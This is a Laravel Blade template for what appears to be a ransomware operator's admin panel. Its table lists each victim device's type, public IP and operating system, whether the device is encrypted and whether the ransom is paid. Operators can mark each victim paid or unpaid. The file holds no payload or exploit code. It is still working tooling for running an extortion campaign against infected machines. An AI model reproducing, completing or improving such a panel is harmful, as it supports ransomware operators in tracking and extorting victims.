@extends('layouts.master') 

@section('content')

<div class="container container-full mt-5">
        <div class="page-inner page-inner-fill" id="fill">

        <!-- 	<span role="alert" class="error" id="err" style="margin-top: 30px; margin-bottom: -25px;" v-for="error in messages">
                <strong style="color: red; font-weight:900; font-size: 16px;">@{{error}}</strong>
            </span>
 -->
            @if(session('status'))
			    <p class="alert mt-5 btn-success status text-white" id="id">{{session('status')}}</p>
			@endif



<!-- 
        	<span role="alert" class="d-block error" v-else-if="type == 'success'">
                <strong style="color: red; font-weight:900; font-size: 16px;">@{{messages}}</strong>
            </span> -->

			<div class="col-md-12 mt-5">
				<div class="card" id="card">
					
					<div class="card-body">
						
						<div class="table-responsive">
							<div id="add-row_wrapper"  class="dataTables_wrapper container-fluid dt-bootstrap4"><div class="row"><div class="col-sm-12 col-md-6"><div class="dataTables_length" id="add-row_length"></div></div><div class="col-sm-12 col-md-6"><div id="add-row_filter" class="dataTables_filter">
                                
                               

								<!-- <button class="btn btn-primary btn-round" onclick="copyEmail(event)" style="margin-left:1rem;">Copy Emails</button>
 -->
								</div></div></div><div class="row"><div class="col-sm-12"><table id="table" class="display table table-striped table-hover dataTable" role="grid" aria-describedby="add-row_info">
								<thead>
									<tr role="row"><th class="sorting_asc" tabindex="0" aria-controls="add-row" rowspan="1" colspan="1" style="width: 195.3px;" aria-sort="ascending" aria-label="Name: activate to sort column descending">ID</th><th class="sorting" tabindex="0" aria-controls="add-row" rowspan="1" colspan="1" style="width: 70px;" aria-label="Position: activate to sort column ascending">Device Type</th><th class="sorting" tabindex="0" aria-controls="add-row" rowspan="1" colspan="1" style="width: 150.417px;" aria-label="Office: activate to sort column ascending">Ip</th><th class="sorting" tabindex="0" aria-controls="add-row" rowspan="1" colspan="1" style="width: 100px;" aria-label="Office: activate to sort column ascending">OS</th><th class="sorting" tabindex="0" aria-controls="add-row" rowspan="1" colspan="1" style="width: 150.417px;" aria-label="Office: activate to sort column ascending">Created At</th>
										<th class="sorting" tabindex="0" aria-controls="add-row" rowspan="1" colspan="1" style="width: 150.417px;" aria-label="Office: activate to sort column ascending">Payment Status</th>
										<th class="sorting" tabindex="0" aria-controls="add-row" rowspan="1" colspan="1" style="width: 60px;" aria-label="Office: activate to sort column ascending">Is Encrypted</th>
										<th class="sorting" tabindex="0" aria-controls="add-row" rowspan="1" colspan="1" style="width: 100px;" aria-label="Office: activate to sort column ascending">Action</th></tr>
								</thead>
								<tfoot>
									<tr><th rowspan="1" colspan="1">ID</th><th rowspan="1" colspan="1">Email</th><th rowspan="1" colspan="1">URL</th></tr>
								</tfoot>
								<tbody>
	                            
	                            @foreach($ransoms as $index => $ransom)
								<tr v-if="extracts !== 'No details are available'" v-for="(detail, index) in extracts" role="row" class="odd">
										
					
									<td  class="sorting_1">{{$index + 1}}</td>

									<td>
									
										{{$ransom->device_type}}
									
						
								    </td>		
									
									<td>{{$ransom->publicIp}}</td>

									<td>{{$ransom->os}}</td>

						
									<td>{{date('d/m/Y , H:i:s', strtotime($ransom->created_at))}}</td>
                                   
                                   <td>
										
										@if($ransom->isPaid == 1)
                                          Paid

                                        @else
                                         
                                         Not Paid  
										@endif





									</td>

									<td>
										
										@if($ransom->is_encrypted == 1)

                                          Encrypted

                                        @else
                                         
                                         Not Encrypted 

										@endif

									</td>

									<td>
										<ul class="admin-action btn btn-default mt-3" style="list-style: none!important;">
											<li class="dropdown">
												<a class="dropdown-toggle" data-toggle="dropdown" href="#">
	                                                Action 
	                                            </a>
											
												<ul class="dropdown-menu">

													@if($ransom->isPaid == 1)

	                                                  <li role="presentation">
														<a class="menuitem" tabindex="-1" href="{{route('notPaid', $ransom->id)}}" onclick="return confirm('Are You Sure?')">Mark UnPaid</a>
													  </li>

			                                        @else
			                                         
			                                       
													<li role="presentation">
														<a class = "menuitem"  tabindex= "-1" onclick="return confirm('Are You Sure?')" href="{{route('markPaid', $ransom->id)}}">Mark Paid</a>
													</li>


													@endif
													
												</ul>
											</li>
										</ul>
									</td>
									
								</tr>

								@endforeach
								
								</tbody>
							</table></div></div><div class="row d-none"><div class="col-sm-12 col-md-5"><div class="dataTables_info" id="add-row_info" role="status" aria-live="polite">Showing 1 to 5 of 10 entries</div></div><div class="col-sm-12 col-md-7"><div class="dataTables_paginate paging_simple_numbers" id="add-row_paginate"><ul class="pagination"><li class="paginate_button page-item previous disabled" id="add-row_previous"><a href="#" aria-controls="add-row" data-dt-idx="0" tabindex="0" class="page-link">Previous</a></li><li class="paginate_button page-item active"><a href="#" aria-controls="add-row" data-dt-idx="1" tabindex="0" class="page-link">1</a></li><li class="paginate_button page-item "><a href="#" aria-controls="add-row" data-dt-idx="2" tabindex="0" class="page-link">2</a></li><li class="paginate_button page-item next" id="add-row_next"><a href="#" aria-controls="add-row" data-dt-idx="3" tabindex="0" class="page-link">Next</a></li></ul></div></div></div></div>
						</div>
					</div>
				</div>
			</div>

        </div>
    </div>

	<div style="margin-top: 3.2rem;">
	@include('footer')
	</div>

</div>




@endsection

